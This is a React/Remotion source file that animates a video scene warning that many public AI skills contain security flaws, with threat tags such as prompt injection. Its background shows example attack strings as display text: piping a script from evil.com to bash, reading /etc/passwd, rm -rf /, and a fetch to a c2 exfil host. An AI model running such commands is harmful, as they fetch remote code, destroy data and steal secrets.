import React from 'react';
import {
  AbsoluteFill,
  useCurrentFrame,
  useVideoConfig,
  interpolate,
  spring,
} from 'remotion';
import {COLORS} from '../lib/theme';
import {INTER, JETBRAINS_MONO} from '../lib/fonts';
import {AlertTriangle} from 'lucide-react';

const THREAT_SNIPPETS = [
  'curl -s http://evil.com | bash',
  'eval(atob("bWFsd2FyZQ=="))',
  'process.env.AWS_SECRET_KEY',
  'fs.readFileSync("/etc/passwd")',
  'exec("rm -rf /")',
  'fetch("https://c2.evil.com/exfil")',
  'require("child_process").exec',
  'Buffer.from(secret).toString("base64")',
];

const THREAT_TAGS = [
  'Credential Theft',
  'Crypto Miners',
  'Prompt Injection',
  'Memory Poisoning',
];

export const Scene1Problem: React.FC = () => {
  const frame = useCurrentFrame();
  const {fps} = useVideoConfig();

  const statSpring = spring({frame, fps, config: {damping: 200}});
  const statScale = interpolate(statSpring, [0, 1], [3, 1]);

  const subtitleOpacity = interpolate(frame, [fps * 1.5, fps * 2.5], [0, 1], {
    extrapolateLeft: 'clamp',
    extrapolateRight: 'clamp',
  });
  const subtitleY = interpolate(frame, [fps * 1.5, fps * 2.5], [20, 0], {
    extrapolateLeft: 'clamp',
    extrapolateRight: 'clamp',
  });

  const sourceOpacity = interpolate(frame, [fps * 3, fps * 4], [0, 1], {
    extrapolateLeft: 'clamp',
    extrapolateRight: 'clamp',
  });

  const tagBaseDelay = fps * 4.5;

  return (
    <AbsoluteFill
      style={{
        background: `radial-gradient(ellipse at 50% 60%, ${COLORS.primary500}15, ${COLORS.surfaceDark} 70%)`,
        fontFamily: INTER,
      }}
    >
      {/* Floating threat snippets */}
      {THREAT_SNIPPETS.map((snippet, i) => {
        const xPos = ((i * 236 + 75) % 1650) + 135;
        const speed = 0.4 + i * 0.12;
        const startY = 1170 + i * 135;
        const y = startY - frame * speed;

        return (
          <div
            key={i}
            style={{
              position: 'absolute',
              left: xPos,
              top: y,
              fontFamily: JETBRAINS_MONO,
              fontSize: 21,
              color: `${COLORS.danger}26`,
              filter: 'blur(1px)',
              whiteSpace: 'nowrap',
            }}
          >
            {snippet}
          </div>
        );
      })}

      {/* Center content */}
      <div
        style={{
          position: 'absolute',
          top: '50%',
          left: '50%',
          transform: 'translate(-50%, -50%)',
          textAlign: 'center',
          width: '100%',
          padding: '0 90px',
        }}
      >
        {/* Main stat */}
        <div
          style={{
            fontSize: 162,
            fontWeight: 900,
            background: `linear-gradient(135deg, ${COLORS.danger}, #f97316)`,
            WebkitBackgroundClip: 'text',
            WebkitTextFillColor: 'transparent',
            backgroundClip: 'text',
            lineHeight: 1,
            transform: `scale(${statScale})`,
            opacity: statSpring,
          }}
        >
          36.82%
        </div>

        {/* Subtitle */}
        <div
          style={{
            fontSize: 42,
            fontWeight: 500,
            color: 'rgba(255,255,255,0.85)',
            marginTop: 24,
            opacity: subtitleOpacity,
            transform: `translateY(${subtitleY}px)`,
          }}
        >
          of public AI skills contain security flaws
        </div>

        {/* Source */}
        <div
          style={{
            fontSize: 21,
            color: COLORS.textSecondary,
            marginTop: 18,
            fontStyle: 'italic',
            opacity: sourceOpacity,
          }}
        >
          Snyk ToxicSkills Study - Feb 2026 - 3,984 skills
        </div>

        {/* Threat tags */}
        <div
          style={{
            display: 'flex',
            justifyContent: 'center',
            gap: 18,
            marginTop: 48,
            flexWrap: 'wrap',
          }}
        >
          {THREAT_TAGS.map((tag, i) => {
            const tagOpacity = interpolate(
              frame,
              [tagBaseDelay + i * 8, tagBaseDelay + i * 8 + 15],
              [0, 1],
              {extrapolateLeft: 'clamp', extrapolateRight: 'clamp'},
            );
            return (
              <div
                key={tag}
                style={{
                  background: `${COLORS.danger}33`,
                  border: `1px solid ${COLORS.danger}66`,
                  borderRadius: 50,
                  padding: '9px 24px',
                  fontSize: 20,
                  fontWeight: 600,
                  color: '#f87171',
                  opacity: tagOpacity,
                  display: 'flex',
                  alignItems: 'center',
                  gap: 8,
                }}
              >
                <AlertTriangle size={18} />
                {tag}
              </div>
            );
          })}
        </div>
      </div>
    </AbsoluteFill>
  );
};
